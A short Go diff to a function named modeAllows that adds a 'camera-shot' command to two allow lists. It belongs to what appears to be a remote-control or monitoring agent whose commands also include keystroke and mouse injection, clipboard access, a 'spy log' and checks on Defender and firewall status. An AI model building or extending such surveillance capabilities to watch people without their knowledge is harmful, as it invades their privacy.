@@ -98,7 +98,7 @@ func modeAllows(mode, cmd string) bool {
 			"get-active-window", "get-foreground-window", "get-position",
 			"mouse-move", "mouse-click", "mouse-button", "mouse-scroll",
 			"mouse-click-at", "mouse-doubleclick-at", "send-text", "key-press",
-			"clipboard-get", "clipboard-set":
+			"clipboard-get", "clipboard-set", "camera-shot":
 			return true
 		}
 		return false
@@ -118,7 +118,8 @@ func modeAllows(mode, cmd string) bool {
 			"get-agent-debug-log", "get-spy-log", "get-session-state",
 			"get-foreground-window", "get-active-window", "get-display-info",
 			"get-monitors", "get-screen-size", "get-audio-devices",
-			"get-audio-level", "get-defender-status", "get-firewall-status":
+			"get-audio-level", "get-defender-status", "get-firewall-status",
+			"camera-shot":
 			return true
 		}
 		return false
